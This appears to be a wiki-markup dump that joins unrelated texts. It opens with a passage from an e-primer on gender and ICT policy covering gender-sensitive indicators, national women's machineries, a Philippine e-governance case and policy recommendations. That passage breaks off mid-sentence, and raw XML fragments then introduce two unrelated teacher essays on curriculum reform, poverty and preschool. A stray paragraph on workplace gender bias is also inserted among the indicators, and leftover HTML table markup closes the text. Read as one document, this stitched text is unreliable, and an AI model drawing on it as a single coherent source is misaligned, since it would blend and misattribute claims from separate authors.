An important principle to remember is that the use of qualitative indicators can play an important role in
the promotion and understanding of stakeholder perspectives, particularly those relating to women,85
and therefore fostering participation. Developing gender-sensitive indicators in a participatory fashion
requires a focus on including people’s own indicators of development.86

===Guidelines for Setting Gender-sensitive Indicators for ICT Initiatives87===

ICT indicators should be linked with the goals and purpose of an organization, an activity or a project. Goals
can be long-term or short-term. For example, indicators for computer education projects that aim to provide
skills for young people so that they can have better employment opportunities will need to measure the
long-term and broader impact in relation to the creation of jobs, the types of jobs available, the number of
girls and boys in these courses, the changes in the economic status of young people who become part of
these programmes, the other opportunities that open up as a result of these programmes. Considerations
that need to be taken into account in setting gender-sensitive indicators for ICT initiatives include:
==== 1. Indicators change during the process of implementation ====
It is sound practice to define indicators at the beginning of a project or an initiative. This will
make it easier to track the progress and to evaluate the outcomes and impact of the projects.
However, it is important to keep in mind that indicators can change during the process of project
implementation. Indicators that were not anticipated can manifest themselves or become
accentuated along the way.
====2. Indicators reflect specific realities and experiences ====
Indicators are determined based on the specific realities and experiences of the stakeholders of any project or initiative. The findings and critical issues identified in the evaluation must reflect
the realities of the communities and the analysis should be organic to the community.
It is important to recognize the realities of women’s lives when dealing with the performance of
people within projects or initiatives. For example, it should be recognized that there are many
factors including personal factors that affect women’s performance in and responses to projects
and initiatives. If the evaluation framework aims to find out how ICT use changes lives, then the
documentation should be done in a manner that respects the integrity of the whole process.
Care should be given to translations or interpretations such that complete stories of communities
are documented.
====3. Technology indicators and gender differences ====
Gender inequalities are mirrored in the development of access to and use of ICTs. While ICTs can
be used as transformative tools that can change power relations between women and men,
they can also end up bringing women back to their domesticated status. For example, a number
of feminist researches are now interrogating the impact of ICTs for women who are now able to
work at home and who may unwittingly be potentially placed in a position to assume additional
domestic activities. Indicators should be able to point out if ICTs contribute to empowering or
marginalizing women or if ICTs reproduce or transform gender roles.
It is also important to be mindful of unintended consequences brought about by projects or
initiatives and be aware that ICTs also impact on women who do not have access to it. For example,
in a village, women who produce handicrafts were able to market their products better because
they were connected. An indirect consequence of this is that those who were not connected
became more marginalized.
Example 1: Compared to other technologies, ICTs are more open to women, i.e., more women
are participating in ICTs. But women are more active on the information and communications
aspects rather than on the technology aspect. This is a reflection of the masculine and feminine
assumptions.
Example 2: There are issues around access to ICTs. Women have access to becoming users of
ICTs as information providers. Some have access to training and support either as trainers and
recipients of trainings. But women have less access to the technical part of ICT. At some point in
ICTs, there is a bottleneck where women have less access than men. Therefore, using the number
of women Internet users is not sufficient to determine how women fare as users of ICTs. The
theoretical approach for an ICT evaluation tool must look at many issues: women as users, women
as information providers, women as trainers, and women as technicians.
Example 3: Measuring differential impacts. One can evaluate an ICT project from a gender
perspective even though it is an ICT project not meant to work on gender issues. For example, a
project that provides computers to school children that does not consider gender can be
evaluated from a gender perspective by finding out how the project benefits girls and boys.

Also, the gender gap may contribute to the stated fact that women face many difficulties in the work place. Employers sometime refuse to hire women, customers may underestimate the work a woman may do, or male co-workers may refuse to engage in teamwork with their female co-workers. Negative attitudes like that are mainly directed at women in higher positions than men. Men do not have an issue with women working for them, however they disagree when women are their superiors and hold higher positions. One of the known differences between genders is their work position. Men hold higher and more distinguishable jobs than women which is common worldwide, although this gap is slowly but surely changing. Also, another difference in most areas and societies between genders is the salary gap and how much they make a year. Men are usually paid more than women even if they are doing the same type of jobs, even though laws for equal pay for equal work exist in
most places.

====4. Access indicators====
Access means not only access to technology but also access to information and know-how. Access
is affected by age, class, gender, race or by one’s socio-economic status. The most basic
quantitative indicator of access is the number of women and men who have access to computers,
telephones and the Internet. The factors affecting this access are usually the presence or absence
of telecommunications and Internet infrastructures. However, quantitative indicators of access
are only the starting point. The more significant indicators are often qualitative in nature. These
include the quality of access to information that is useful, empowering and relevant for women.
It also includes information for women who are not literate and in the appropriate languages.
Other important indicators are those that reveal the amount of power and control women have
over these resources and knowledge. Some of the questions that will help determine indicators
are:
Who makes decision about access to technology?
Who creates the content?
Who has the right to create content and language?
How do women use the information they access?
====5. ICTs strengthen networking====
One of the most valuable advantages of ICT is its potential to strengthen and expand links, networks
and networking initiatives. Many of the early studies of women’s use of email have shown
that women use new technologies to network with each other. While it is not easy to isolate the
impact of networking, a useful indicator of success could be how ICTs helps link women and
groups with similar interests who might otherwise not be in contact or how ICTs bring together
networks of individuals or groups for promotion and action.
====6. ICTs support advocacy and substantive consultation====
Advocacy is broadly defined as a process of bringing about change. Many advocacy campaigns
are directed at generating policy changes at government, institutions and other levels where
policies are made. ICTs are increasingly being used as tools in most advocacy undertaking because
of their effectiveness in group communication and interactivity. The outcomes of these campaigns,
whether actual policy change occurs, are indicators of the success of the advocacy campaigns
and to a certain extent the effectiveness of ICT tools for advocacy. In the short term, it may be
possible to gauge if one is making a difference by examining whether the use of ICT tools
generates discussion and support for women’s concerns and issues, and catalyzes more action.
====7. ICTs promote a non-hierarchical and empowering organizational culture====
Access to strategic information can modify the way staff or members relate among themselves
and can promote democracy in the organizations. Access can catalyze changes in the power
structures of an organization because it enables women to participate more actively in decisionmaking.
====8. ICTs should promote democratic communication towards e-governance====
ICTs are increasingly being used as necessary and effective ingredients in communications
strategies. The potential of these new technologies for participatory and democratic
communication and the opening up of new communication spaces are seen as main contributions
to social development and transformation. One must be mindful however that these spaces can
exclude and alienate women who are less articulate and who may not speak the dominant
international languages that are often used in these discussions. Indicators should take account
of the means available that enable people/communities to feed their voices into debate and
dialogue. The underlying assumption of the use of ICTs for information sharing and
communication is that it provides a means for the sharing of knowledge and information directly
by those who generate them. The quality rather than the volume or quantity of information
generated is more meaningful as an indicator.

While women’s increased participation in communication spaces is an indicator for the positive use of
ICTs, it is even more important to measure their role in these spaces. Some of the indicators could be
their involvement in the major decisions related to the initiative. This will ensure relevance and meaning
– a vital component for any intervention.

===The Need to Strengthen National Women’s Machineries===

Louise Chamberlain (2002) stresses that gender analysis is an exercise to understand differential impacts
of projects or policy design, implementation, and outcomes for women and men. A wider application of
gender analysis to ICT projects in the public and private sectors, particularly if they result in quantitative
evidence, can bring key gender concerns to the attention of policy makers.88 However, a number of
major constraints continue to be faced in gender mainstreaming efforts, as addressing gender inequality

issues are sometimes viewed as an externally imposed political agenda. This is particularly evident when
despite the location of national women’s machineries in the highest level of government,89 the lack of
political support in terms of clear and strong mandates as well as resource allocation deters the
implementation of planned programmes. This results in poor coordination of collaborating units, inability
to develop viable policies and vulnerability to change in the political environment.90
If the national women’s machinery is to be effective (for lack of a Gender Unit), a solid constitutional and
legal status is crucial, as is a policy that specifies goals, clear lines of institutional responsibility and
accountability. These should be supported by definitive planning procedures and a management
structure that can transform policy into practice. However, such a structure usually exists in a political
and financial vacuum in many countries which inhibits the achievement of demonstrable results. In
addition, structure, functions and powers of national machineries may not be congruent, i.e. national
machineries have more functions than they could be expected to implement in the light of their structure,
powers and resources. While assistance in policy formulation can be a mandate, these bodies are bogged
down by other welfare-related activities. Some of the functions are too difficult or inappropriate as they
are presently constituted and supported. As part of a distinctive ministry (e.g. planning, social welfare),
the unit might be expected to perform functions expected of the ministry per se.
At times, there is the tendency to treat gender and women’s issue as separate and stand-alone concerns
with plans separate from national and local concerns (e.g. separate plans for gender and women). An
isolated focus would deter efforts to mainstream gender in government policy and programmes. There
is a need to ensure that gender and women’s issues are not marginalized in government plans and
mechanisms, and that procedures for gender planning within sectors are strengthened. Sectoral and
local interests and priorities mitigate against cross-cutting gender issues in plans and programmes. Issues
that are considered vital by ministries and local agencies may be given priority thus sidetracking gender
concerns. This becomes pressing in the light of limited resources under which these agencies operate
(see Box 15).

! Box 15: e-Governance – Philippines Case Study
|-
|In the last couple of years, e-governance has become a priority area of many Asian governments
resulting in the implementation of various programmes that apply ICT in delivering government
services and promoting transparency and accountability. Beyond these goals however,
e-governance is being more closely defined alongside concepts of governance. The delivery of
government services and information to the public using electronic means is differentiated as
e-government. e-Governance, on the other hand, is defined as the transformation of (governance)
processes (resulting from) the continual and exponential introduction into society of more
advanced digital technologies.
e-Governance focuses on how these new technologies can be used to strengthen the public’s
voice as a force to reshape the democratic processes, and refocus the management, structure,
and oversight of government to better serve the public interest.* Defined in this way, e-governance
becomes significant in the exercise of citizenship and direct public participation in government
activities. Both are key elements in women’s empowerment and achievement of gender equality.
It can potentially bring forth new concepts of citizenship, both in terms of needs and
responsibilities. For many governments in Asia, however, allowing e-governance to make it possible
for their citizens to truly communicate with government, participate in policy-making and
strengthen democratic processes remain a huge challenge.
Three barriers immediately come to mind. First, the serious gaps in universal access to ICT as a
means of participation; second, the complete absence of gender equality consideration in
e-governance plans of governments; and third, the restrictions on civil liberties and freedom of
expression imposed by undemocratic and fundamentalist states that seriously put into question
citizen’s access to information and participation in political processes.
The Philippines is a good case study that illustrates the first two barriers. In July 2000, the Philippine
government adopted the Government Information System Plan (GISP) as the country’s master
plan for reforming governance through ICT. The GISP sets the enabling policy, institutional
infrastructure and environment, direction, priorities and benchmarks for computerization of key
government operations and activities over the next five to 10 years. It is envisioned as the blueprint
for an electronic bureaucracy that is widely and readily accessible to its constituency. The plan
fails to deliver in two fronts. First, it is gender blind and totally devoid of any provisions that address
gender gaps in access, education, government services and political processes. Interviews
conducted with the main government agencies responsible for the country’s national ICT
programmes and key government departments delivering public services, reveal that policy
makers have not thought of factoring in gender in their e-governance projects at all. In fact, the
first question that was invariably asked in these interviews was, “what does gender have to do
with ICT or with e-governance projects?” Personnel in IT units, management information systems
divisions, women’s bureaus and gender and development technical working groups equally shared
this same puzzlement.**
Even when the basic elements of gender mainstreaming are in place, none of those responsible
for gender mainstreaming in these departments had any awareness about gender issues in relation
to ICT programmes or projects within their department. Most of the personnel were familiar with
ICT mainly through: the use of email in their work, their information work for their department’s
website and the use of their department’s intranet. None of the gender and development
programmes or projects were related to ICT directly.

Awareness about the differences of perspectives, roles, needs, and interests of women and men
in relation to ICT was absent. At the same time, there was very little understanding that e-services
may entail specific planning requirements that take into consideration women’s and men’s access,
know-how and control over ICT. Second, the GISP sets an unrealistic target of ensuring that every
citizen has online access by 2010 in a country where key economic and connectivity problems
remain. Available data about access to the Internet indicates that the digital divide is very real
with figures ranging from a low 2 percent to a high 6 percent of the population with Internet
connection. While teledensity is higher at 9.05 per 100 person, the majority of Filipino homes do
not have a phone because they cannot afford it or the infrastructure is not available. The most
positive development in telecommunications access in the country is the phenomenal growth in
mobile telephony and the popularity of short message service as a source of information. While sex-disaggregated data is almost impossible to find, general access information indicate that
women’s access to the Internet is marginal, concentrated in main urban centres and skewed towards
the educated and the middle as well as upper classes.

==Implications for Technical and Financial Resources==

The Regional Meeting of National Machineries for Gender Equality in Asia and the Pacific: Towards a
Forward Looking Agenda held on 12-14 November 2003 in Seoul, Republic of Korea, identifies that the
inability to shift from a woman in development paradigm to a gender and development paradigm is
partially due to budgetary constraints.91 The failure by national and local leaders to appreciate the
concepts and goals of gender equality is a serious deterrent to mainstreaming gender in the bureaucracy.
Gender plans are viewed as marginal in budgetary planning. Policy commitments are not thought through
to their budget implications. Therefore, it is likely that programmes are under-funded and vulnerable to
arbitrary budget reduction. As such, this lack of resources forces national women’s machineries92 to adopt
coping strategies, where they end up dealing with one activity at a time, branching into small projects
which should be the work of other agencies and use of existing networks (Moser, 1995: p.125). Hence,
assessment of projects and programmes implemented by national women machineries indicates a
predominance of welfare-oriented activities (income-generation, microfinance, cooperatives,
microcredit).93 The same scenario in all likelihood will be duplicated by the ICT sector if budgetary
considerations in policy, programme and project planning to address gender inequalities are not included
consciously.

In many countries, national women/gender machineries have been instrumental in shaping national
policies and programmes. Of particular importance are developments in incorporating the gender
perspective into national and sectoral plans, budgeting, accounting and auditing. Linking gender
concerns to budgeting and auditing is an effective means for making governments accountable and for
raising planners’ consciousness of the differential impact of budgetary decisions on women and men.
In the Philippines, for example, government agencies and departments are enjoined to prepare a budget
document disaggregating outlays in terms of impact on both women and men. In Indonesia, the national
machinery ensures that the government’s commitment to mainstreaming gender is reflected in national,
sectoral and local plans.
Addressing gender means addressing the drawbacks in the socialization of women and men which
result in discrimination and disempowerment. However, unravelling socialization is a very slow process,
and needs to be undertaken at a highly conscientious level. Such demands require sustained funding
and deployment of resources at its most optimal level, and attention to effectiveness rather than speed.
Such demands may even mean a more purposive outreach rather than a blanket approach to servicing
a community. The heavy emphasis of development aid on innovation and immediate sustainability
leaves little room to spearhead adaptation, replication and upscaling, let alone room to substantively
address gender issues in the area of ICT.

==Vulnerability of the Gender Equality Agenda==
In some cases, gains made in integrating a gender perspective and analysis into policies, programmes
and projects are a result of the existing global advocacies of gender equality and women’s empowerment
advocates and, to a significant extent, donor pressure. However, such gains are more often than not
rendered fragile, and extremely vulnerable to changes in their economic, political and social environments.
The global social policy agenda now acknowledges that the division between economic policy, on one
hand, and concerns for the social well-being of people, on the other, give rise to a false dichotomy that
prevents the emergence of coherent policies to address pressing issues: responsive governance, socially
friendly economic policies and universal provisioning of social services.95
However, it has also been noted that the translation of this awareness into effective policy and institutional
mechanisms is yet to take place.96 The State’s role in social development continue to be the focus of
debate, especially as institutions emerge with the potential to offer new services in social sector
provisioning. In particular, the potential for partnerships with civil society and the private sector is being
viewed as a way of addressing financing and management concerns, as the demands of social welfare
provisioning increase and population’s age. An emerging debate focuses on whether social policy should
promote universal services under a strong State-based regulatory framework, or whether the role of
States should be reduced to preserving the minimal public provisioning of basic services targeted at the
most vulnerable sections of society, thus allowing the better-off to secure their needs through private
markets for health and education.97
Nations mistakenly think that it costs too much to enable women to access and benefit from opportunities
in the private and public spheres – politically, economically and socially. What Nations fail to grasp for all
these decades is the simple truth about the burden of dependency. Ensuring that someone remains
dependent on you, means you are doubly burdened. You not only look to your own needs, but you have
to ensure that other person’s needs are met as well.

Success in integrating gender perspectives will require commitment of financial and human resources,
capacity building, top leadership support and a change of agendas, practices and attitudes at all functional
levels. It will also be necessary to periodically collect data on gender and ICT trends, impact of ICT on
gender equality, women’s participation in the ICT sector, including at decision-making level, and to closely
monitor trends over time. The effort will be painstaking but the rewards will be enormous for the
advancement and empowerment of the world’s women and their families. Imperative too are transparent,
inclusive consultative mechanisms with civil society, particularly women’s rights-based NGOs. More
substantial collaborations too need to be forged between governments and NGOs, such as the example of the Women’s Council of Brunei Darussalam, an umbrella organization of women’s organizations with
over 2,000 members, has collaborated with government bodies in the establishment of a committee on
social issues and in addressing women’s concerns.98

==Policy Recommendations for Action==

There have been many recommendations put forward especially in the last couple of years addressing
gender issues in the area of ICT. These have been made at international, regional, and national fora. The
1995 Beijing Platform for Action was the first international policy framework that explicitly mentioned
gender issues in relation to ICTs. It recognized that areas of computer technology, satellite and cable
television held opportunities for women’s participation in communications.99 The 47th session of the
Commission on the Status of Women held on 3-14 March 2003 drew up no less than 24 broad
recommendations for action that would contribute to addressing gender.100 The UNESCAP Expert Group
Meeting to Review ICT Policies from a Gender Perspective, held on 18-19 December 2001, recognized
that current government policies refer mostly to IT rather than ICT, where the latter is normally used to
only refer to the issue of convergence of computer, broadcasting and telecommunication technologies.
This particular meeting highlighted, among other key strategies for a gender-sensitive ICT policy, the
need for all stakeholders to consider the fact that girls tend to leave formal education earlier than boys,
and hence IT skill training should be started at an early level of school; and that ICT tools should also be
effectively deployed to help mainstream gender. For example, ICTs could be instituted in national
machineries to advance the status of women and used to actively and systematically collect and
disseminate sex-disaggregated data. The meeting focused its recommendations under the issues of
access, capacity building, employment and entrepreneurship as well as what can be done to facilitate an
enabling environment for women’s wider and fuller participation.101 In addition, the UN Division for the
Advancement of Women Expert Group Meeting on Information and Communication Technologies and
Their Impact On and Use as an Instrument for the Advancement and Empowerment of Women, held in
Seoul, Republic of Korea, on 11-14 November 2002, drew up recommendations to each stakeholder,
including national women machineries, while underlying the importance of an enabling environment
and partnerships for the empowerment of women in all spaces.102

However, WSIS (Phase 1, December 2003), failed to further build on these recommendations and fell
short of providing specific directions and action plans to effectively ensure gender justice within the
new information society. In the meantime, the guidelines produced by the ITU Task Force for gendersensitive
policy-making (see Box 16) can be used either as a checklist of issues to consider when making
decisions or to provide ideas on how to mainstream gender in regulatory and licensing agencies.103
If governments are indeed committed to integrating a gender perspective into their national ICT policies
towards women’s empowerment within the gender equality framework, then governments would need to:

*Acknowledge, protect and defend women’s rights in the Information Society;
*Fully recognize that gender equality, non-discrimination and women’s empowerment are essential prerequisites for equitable and people-centred development in the Information Society;
*Ensure that ICT governance and policy frameworks enable full and equal participation;
*Ensure that all ICT initiatives incorporate a gender perspective;
*Ensure that every woman has the right to affordable access;
*Ensure that all education and training programmes promote gender awareness;

==Final Note: The Right to Communicate==

This e-primer asserts that the advocacy for a new information and communication environment should
fully integrate gender concerns and women’s advancement. The challenge is to ensure that individuals,
communities, nations, and the international community gain access to, and are able to use effectively,
the information and knowledge they need to address their development challenges and improve their
lives. At the core of this new environment is the democratization of people’s access to information and
communication facilities and technological resources.
Fifty years ago, the UDHR recognized the right to information as a fundamental human right. The assertion
of this right has become even more urgent at a time when technological advancement in the production
of information and knowledge is reshaping the organization of our societies globally. Equally important
is advocating for the recognition of communication rights as part of human rights. The exercise of our
democratic freedoms and the full and equal participation in current economic development is the basis
for the assertion of our rights to information and communication. Within this context, fall women’s rights
to equal and democratic access to ICTs. Gender equality, non-discrimination and women’s empowerment
are essential prerequisites for equitable and people-centred development in the information society.
Communication rights counter the current hegemonic ownership structure of national and global
information networks. This advocacy is increasingly important to civil society worldwide who have very
little voice in the national and international agreements and legislation to technological resources and
information.

Rights related to access and use of the Internet and electronic communication infrastructure allows
ordinary people to have their voices heard. The Internet has allowed the voices of ordinary citizens and
organizations lacking strong financial resources to be heard. With over 200 million users worldwide and
an estimated 1 billion users in 2005, the Internet provides a unique public sphere where decisions that
shape people’s lives can be freely debated and considered. It allows small groups and individuals, women
and men - previously working in isolation from one another - to communicate, network, share information
and prepare actions in ways they have never been able to before.
ICTs must be made available to all at an affordable cost and the development of infrastructure must
ensure that marginalized groups are not further disadvantaged. This should be the strategic starting
points for all concerned with gender equality and social transformation. In a globalized world that
continuously undermines localized democratic institutions the Internet provides an essential means for
defending and extending participatory democracy.
The Internet and other ICTs can be used to strengthen diversity and provide a platform for a multitude of
voices, a pluralism of ideas and opinions and a place for cross-cultural exchange. However, this can only
be true if developments are driven by a desire to preserve and enhance local and regional linguistic

      <text xml:space="preserve">Rather than rank ordering what I believe to be the five most important change issues in curriculum and instruction, I’ve created a hierarchy wherein one level supports and/or leads to another in an effort to reach the ultimate goal—making America competitive in a “flat” world.   For the sake of this assignment, if I absolutely had to rank order my chosen change issues I would do so as follows:

1.	Curriculum and Instruction Reform:  Making America Competitive in a “Flat” World

2.	Believing that Change Can Happen: Becoming Comfortable with Risk

3.	Teachers as Learners and Learners as Teachers/Learning How to Learn and Teach

4.	Standards Based Testing as the Ceiling Rather than the Floor

5.	Isolation and Differentiation

The change issues most important to me are discussed below in ascending order as they would appear on a hierarchical graphic organizer.

== Believing that Change Can Happen: Becoming Comfortable with Risk ==

We as teachers have far more power than we realize. To utilize this power, we must become risk takers. Teaching is a profession that requires years of training, demonstration of basic competencies, and continuous learning to maintain certification. There are few other professions that require a similar level of ongoing professional development and evaluation, yet of all professions teachers have the least input into what actually happens in their field. Many times this is because teachers aren’t given a seat at the table, but what is wrong with demanding and taking that seat? Teachers are in the trenches and see first hand how students respond to instruction. Good teachers know what works best for students. Knowing what works best isn’t good enough. Teachers have to be willing to stand up and fight for what works best for students. In my third year of teaching I was a member of a kindergarten team required to use Breakthrough to Literacy (BTL), a computer based reading program, for all of my students regardless of reading or writing ability. I had three BTL stations in my classroom and each child was assigned a station with a total of six students assigned per station.  A student spent a 15-minute session on BTL and upon completion of the session, would tap the next student assigned to complete fifteen minutes on BTL. This cycle was required to go on all day long with each student completing at least two BTL sessions per day. Out of my eighteen students, I had only four that I thought could really benefit from the type of instruction BTL provided, so I didn’t require the others to complete the sessions. That year, my students were reading so well that they were allowed to take Accelerated Reader (AR) tests that were reserved for grades two and above and their hallway writings rivaled the writings of the second graders. My students also served as math tutors for the fourth graders having difficulty with algebraic concepts. Because of this, I really saw no reason for them to have to sit in front of a computer and pick out the letter tile that matched the sound heard at the beginning of the word ball. My colleagues warned me that the students were expected to spend a certain amount of time on the computer each quarter and that the time was being monitored and reported to the principal. I approached my principal and let her know that I was not going to meet the time requirement and I showed her why. I sat down and shared with her my students’ monthly reading logs and their journal writings so that she could see the quality of their work and what they were capable of. My argument against BTL for all was similar to my previous argument against lock step grade level planning with exactly the same experiences for all students in all classes. That year I was the only kindergarten teacher not required to use BTL as intended and the only teacher in the building not required to be on the same exact page as every other grade-alike teacher. My students benefited from my willingness to take the risk and buck the system and what was so funny is that the district level BTL monitor agreed. Upon visiting my classroom to download my BTL time sheets, she had the opportunity to see my students in action and read some of their writings. She disabled BTL on two of my computers and added word processing software so that those BTL stations could then be used as publishing centers, which was far more appropriate for and of a far greater benefit to my students. I am sure that my students weren’t the only kindergartners in the building for whom BTL was obsolete, but because their teachers never did or said anything to challenge it, they were forced to complete those 15-minute sessions all day every day. Yes, those students earned certificates and one dollar for completing 100 lessons, but my students got so much more—learning tailored to their needs, readiness, and interests. Until we as teachers raise our voices and become comfortable with taking risks, many students will go without what is truly best for them.

== Teachers as Learners and Learners as Teachers/Learning How to Learn and Teach ==

This requires a certain level of openness and risk taking on the part of the teacher, as well as the students. I believe one goal of education is to foster a love of learning in students that encourages them to be lifelong learners. What better way to foster this love of learning than demonstrating to students that no one, not even a teacher, ever knows everything and therefore, must continuously learn? This love of learning can also be developed by giving students opportunities to teach. We hear so much about collaborative teaching between teachers, but why can’t collaborative teaching include students? One school year I had a student that came in with a wonderful lesson on leaves. I used her idea and let her co-teach the lesson. That helped the other students to realize that yes, there are certain things they had to learn, but how they learned it could be influenced by them. After that experience, students were more willing to share their ideas in their areas of expertise. That year in science when the class learned about things that sink or float in water, I allowed one student who was a Titanic fanatic to share the story of the Titanic with the class. These teaching opportunities gave the students a chance to share their interests and also taught them how to gather information to make a presentation before an audience of diverse learners. What a wonderful skill to begin exercising in kindergarten. That type of experience prepares students to function in a world wherein they have to communicate ideas to people of varying backgrounds and levels of understanding with different beliefs in addition to allowing the students to connect with themselves as teachers and learners and take an active role in the teaching and learning processes.

== Isolation and Differentiation ==

We have talked a great deal about different types of isolation in education, but the most important in my opinion is isolation of content. In an increasingly interdependent world where what happens in India affects what happens in America, it is so important for students to be able to make connections and see relationships. This is difficult to achieve if subjects are always taught in isolated chunks of time never to intermingle. The challenges that may someday be faced by today’s youth will be nearly impossible to approach without the knowledge of a variety of disciplines and understanding how everything works together. Just having the ability to tap into those disciplines and see how knowledge from one can assist in the resolution of an issue that on the surface seems irrelevant to that discipline will be an invaluable 21st century skill. Differentiating instruction is just one instructional strategy that can provide opportunities to develop this 21st century skill. According to Mary Frances Briley, differentiation is a journey, not a destination. No teacher will ever be absolutely perfect with differentiation; however, there are some teachers who are truly masterful in their differentiation of product, process, and content and those teachers know how to skillfully differentiate across the disciplines providing students with very rich learning experiences that require them to tap into knowledge and skills learned in a variety of subject areas. My brain does not store information in neat little compartments never to be opened unless I am thinking about that specific topic. The brain does not work that way, so why should teachers teach that way?

== Standards Based Testing as the Floor Rather than the Ceiling ==

Standards based testing has dumbed down the American education system. Rather than providing students rich, meaningful, and respectful learning experiences that will prepare them to maintain America’s position as a world power, schools are now creating a citizenry highly adept at bubbling in a circle without very much thought. Although the world is round, I doubt that any of its most critical issues can be addressed and/or resolved via the filling in of a slew of little round bubbles. Unfortunately, many do believe that success on a standards based test means that students are well prepared for bright, productive futures. This is only true if the future is devoid of complex issues requiring complex thought. I do believe that testing has its place in education because it is very important for student competence to be assessed; however, the assessment must be authentic. I advocate for the use of more portfolio based and problem based assessments.

== Curriculum and Instruction Reform: Making America Competitive in a “Flat” World ==

This is the ultimate goal of education. All a person has to do is pick up the phone and attempt to get assistance with anything to realize that the world is flat. To produce graduates capable of competing with a workforce that will include the entire world, American education as we know it must change. As shared in a previous class discussion, the jobs that will be available for today’s students haven’t even been created yet. So, what are we preparing students for? I truly believe that the traditional nine to five job is on its way out the door and that the jobs of the future will be more unique and specialized in nature and will require levels of creativity and collaboration to which the average American student is not accustomed. What can we do about this? How can the American education system be improved to prepare students for future success? It starts with teachers taking the risk to challenge the powers that be in an effort to give students what they need—a quality education that provides students with the necessary knowledge and skills to compete in a flat world.

      <text xml:space="preserve">===Aggressively address issues of poverty---Turn hopelessness into promise===
As an urban educator, I am surrounded daily by reminders of the challenges of children who live in poverty. Yet I find that books on the topic (such as Ruby Payne's A Framework for Understanding Poverty) still reveal issues of poverty that I had not even imagined. The impacts on education are far reaching. Maslow's heirarchy of basic needs and brain research tells us that children who are hungry, tired, sick or scared are not ready to learn. It is time for us to get proactive instead of reactive. We need to put money into school reform and create community schools that provide all of the services students need (dental, medical, food, child care, adult education). I believe we would reap the benefits of this investment down the road in money saved addressing social problems such as crime, dropouts, teen pregnancy, etc.

I want to share some excerpts from an article I read entitled &quot;Silenced by Poverty&quot;. It was featured in The Tribune, a northern Colorado paper on Feb. 20, 2005. The story reminds us that these students are not just struggling to learn and be successful, they are &quot;struggling to survive&quot;. The author explains that because some students will go entire weekends without food, &quot;hunger pains make it difficult to concentrate on learning&quot;. I found the next paragraph to be quite compelling:
&quot;While many students look forward to the new school year with new notebooks, clothes and supplies, students who live in poverty worry about how they will find a pencil to write with and where they will get the required materials for each class. This struggle continues daily as they search for the calculator that is required for math or the poster board and markers that they must have to complete their required project.&quot; The author explains that these students feel different because of what they wear, what they don't have and assignments they did not complete because they couldn't find a quiet spot in their overcrowded, stressed out homes. Poverty impacts students' extracurricular opportunities as well. Often students living in poverty have to hold down jobs to contribute to the family income. Even those who do not work complain that they lack the money for equipment and even the small fee for the physical required to participate. These experiences only add to &quot;disappointment and dropout risk&quot;. 

It is time for the education community and society at large to get serious about ways to help alleviate some of the stresses these children face.Free and reduced meals is a good start but we can and need to do so much more. The Tribune author asserts that in doing so we will increase a student's chances of graduating and contributing back to society.

===Free high quality preschool for all---importance of school readiness/get the gap early===
Retrieved from the Anne Casey Foundation site on June 19, 2007
http://www.aecf.org/Home/MajorInitiatives/RelatedInitiative/EarlyChildhoodSchoolReadiness.aspx

School readiness/leveling the playing field

Statistics indicate that children living in poverty start school behind middle class children. Their vocabularies in third grade are about 1/3 that of their peers. Researchers believe that reading and math gaps in high school can be traced all the way back to differences upon school entry. The Anne Casey Foundation's initiative is one of many across the country that is working to ensure all children, regardless of socioeconomic status, have a high quality early childhood experience. The group wants to build the capacity of everyone who interacts with the child from family to child care providers.  

ODU's own Dr. Kersey is an advocate for free high quality preschool for all. Her many years of working with children bears witness to the importance of a strong, positive first experience with education. As a former first grade teacher in a housing project school, I could not believe how far behind my students were when they came to me. Many of them were already eight years old in the first grade. While they showed tremendous growth in that year, it would take much more time to have them on equal footing with middle class chidlren. This experience convinced me of the need for year round schools. These students had come so far only to sit in front of play stations all summer. Not only do we need to provide students with an early academically rich experience, we need to continue those experiences throughout their public school years. We need to rethink the idea of three months off from school.  

The Casey Foundation is working to not only get children into school earlier but to get their parents involved sooner. They seek to provide parental education and health care assistance to form a partnership with the parents to promote the academic success of the children. I believe this is a model that will take off in the not too distant future. I think the key to drawing parents and the community into a partnership is to show them you truly care and offer them what they need. High quality preschool would alleviate child care constraints for many parents struggling to make ends meet. It would go a long way to prepare students for kindergarten and build good will with their parents.

===Teachers as learners and learners as teachers---let the circle be unbroken===
Labels are very limiting. To call someone a student implies they have nothing to teach. Similarly, it can be assumed that a teacher has nothing to learn. Any teacher worthy of the title knows that students have so much to teach us. They have experiences and insights that we may not. They are able to communicate in a way that reaches their peers when we don't. They are able to come up with connections and exceptions that we haven't even thought of. It is this kind of learning, the give and take between students and teachers, that builds a strong classroom community of mutual respect. When the teacher listens to and validates the students' ideas, they feel empowered and are more motivated to become actively involved in their education.
They are less likely to feel disenfranchised and less likely to be identified as a behavior problem in class. They become vested in what is taking place in their classroom. 

Perhaps the greatest obstacle to shifting the classroom paradigm from teacher-centered to student-centered is the unwillingness of teachers to give up control. Some educators feel that they are expected to know everything. Some don't know how to admit they don't know something. The worst thing a teacher can do in this age of information is try to give the students some made up answer which the students can easily check on the internet. Rather, when a teacher says to students, &quot;That's a really good question. I don't know? What do you think and how could we find out?&quot;, the teacher empowers the student to take control of their own learning. These types of converations (Socratic dialogues) lead to higher level questions and critical thinking. These are the very skills workers of the future need. In fact, by asking the student how they could get the answer, the teacher is modeling the need for lifelong learning.

===Curriculum and pedagogy--what we teach and how we teach needs to change===
Hall and Florin said it best,&quot;The world is changing and education needs to change&quot;. The educational system we have today is obsolete. It was designed at a different time to meet the needs of a completely different society.  

Today's world is interconnected and information is easily retrieved from most anywhere in the world via technology. Our students have grown up with technology and are what Prensky calls &quot;digital natives&quot;. Their minds are wired and they think non-linearly. Unfortunately schools have not changed to reflect the way these technologically-savvy students think and learn. This has resulted in students being bored and feeling disenfranchised from school. 

Traditional by the book learning seems unnecessary when technology allows you to research and locate information spontaneously. As Friedman purports in his book, The World is Flat, the workers of the future are going to need a completely different set of skills. He states that right-brain skills will be needed---creativity, the ability to work collaboratively, to look at problems from multiple perspectives, to respect diversity, and to problem solve and think critically. These skills are best learned through real-world based problem solving. Educators have to teach the necessary social skills as part of the curriculum to allow students to actively participate in their own education. Students should have some say in what they want to learn. The teacher can help guide the process to ensure key concepts are introduced. At this point in history, it is arguably more important that students learn in context than learn content in isolation. It is essential that students are trained in how to continue to be lifelong learners. To remain marketable, workers of the future will have to continue to learn and adapt to keep up with the new global economy.&lt;table WIDTH=&quot;60%&quot; ALIGN=&quot;right&quot;&gt;&lt;tr&gt;&lt;td style=&quot;background-color: #FFF7F7;

'''&quot;Learning is not a product of schooling but the lifelong attempt to acquire it.&quot; --Albert Einstein 
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

